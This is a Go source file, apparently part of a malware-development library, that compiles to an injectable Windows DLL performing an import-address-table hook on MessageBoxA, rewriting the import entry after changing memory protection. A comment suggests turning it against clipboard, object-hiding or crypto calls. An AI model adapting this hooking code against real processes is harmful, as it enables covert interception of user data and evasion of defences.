//go:build windows
// +build windows

// Perform an IAT hook into an injected process, this one hooks the MessageBoxA function but could be used against more interesting targets such as clipboard, hiding objects, crypto calls :)
package main

// build with:
// go build -buildmode=c-shared -ldflags="-w -s" -trimpath -o iathook.dll

/*
extern int HookedMessageBoxAFunc(unsigned int hWnd, char*, char*, unsigned int);
*/
import "C"

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"github.com/stavinski/malgo/win32"
)

const (
	IMAGE_IMPORT_DESCRIPTOR_SIZE = 20
	IMAGE_THUNK_DATA_SIZE        = 8
	DLL_NAME                     = "USER32.dll"
	FUNCTION_NAME                = "MessageBoxA"
)

var (
	modUser32           = syscall.MustLoadDLL(DLL_NAME)
	OriginalMessageBoxA = modUser32.MustFindProc(FUNCTION_NAME)
)

func setHook() error {
	// Guidance from https://www.youtube.com/watch?v=uS22dBJpr7U
	baseAddr, _, err := win32.ProcGetModuleHandleA.Call(win32.NULL)
	if baseAddr == win32.NULL {
		return err
	}

	//TODO: work out if 32 or 64 bit
	dosHdr := (*win32.IMAGE_DOS_HEADER)(unsafe.Pointer(baseAddr))
	ntHdr := (*win32.IMAGE_NT_HEADERS64)(unsafe.Pointer((baseAddr + uintptr(dosHdr.E_lfanew))))
	optHdr := (*win32.IMAGE_OPTIONAL_HEADER64)(unsafe.Pointer(&ntHdr.OptionalHeader))
	impDescr := (*win32.IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer((baseAddr + uintptr(optHdr.DataDirectory[win32.IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress))))

	dllfound := false
	for impDescr.Name != 0 {
		// get dll name and compare
		dllName := win32.BytePtrToString((*byte)(unsafe.Pointer(uintptr(impDescr.Name) + baseAddr)))
		if dllName == DLL_NAME {
			dllfound = true
			break
		}
		// get the next entry in memory
		impDescr = (*win32.IMAGE_IMPORT_DESCRIPTOR)(unsafe.Add(unsafe.Pointer(impDescr), IMAGE_IMPORT_DESCRIPTOR_SIZE))
	}

	if !dllfound {
		return fmt.Errorf("could not find DLL: %s", DLL_NAME)
	}

	funcfound := false
	origFirstThunk := (*win32.IMAGE_ORIG_THUNK_DATA64)(unsafe.Pointer(uintptr(impDescr.OriginalFirstThunk) + baseAddr))
	firstThunk := (*win32.IMAGE_FIRST_THUNK_DATA64)(unsafe.Pointer(uintptr(impDescr.FirstThunk) + baseAddr))
	for origFirstThunk.AddressOfData != 0 {
		importByName := (*win32.IMAGE_IMPORT_BY_NAME)(unsafe.Pointer(uintptr(origFirstThunk.AddressOfData) + baseAddr))
		funcName := win32.BytePtrToString(&importByName.Name[0])
		if funcName == FUNCTION_NAME {
			funcfound = true
			break
		}
		origFirstThunk = (*win32.IMAGE_ORIG_THUNK_DATA64)(unsafe.Add(unsafe.Pointer(origFirstThunk), IMAGE_THUNK_DATA_SIZE))
		firstThunk = (*win32.IMAGE_FIRST_THUNK_DATA64)(unsafe.Add(unsafe.Pointer(firstThunk), IMAGE_THUNK_DATA_SIZE))
	}

	if !funcfound {
		return fmt.Errorf("could not find function: %s", FUNCTION_NAME)
	}

	oldProtect := uint32(0)
	res, _, err := win32.ProcVirtualProtect.Call(uintptr(unsafe.Pointer(firstThunk)), 8, uintptr(win32.PAGE_EXECUTE_READWRITE), uintptr(unsafe.Pointer(&oldProtect)))
	if res == 0 {
		return err
	}
	firstThunk.Function = uint64(uintptr(C.HookedMessageBoxAFunc))
	res, _, err = win32.ProcVirtualProtect.Call(uintptr(unsafe.Pointer(firstThunk)), 8, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	if res == 0 {
		return err
	}

	return nil
}

// Will be called when injected into process
func init() {
	if err := setHook(); err != nil {
		// only going to be use of use against console apps for GUI app will need to use msgbox or other mechanism to capture
		fmt.Fprintln(os.Stderr, err)
	}
}

func main() {
	// no-op
}
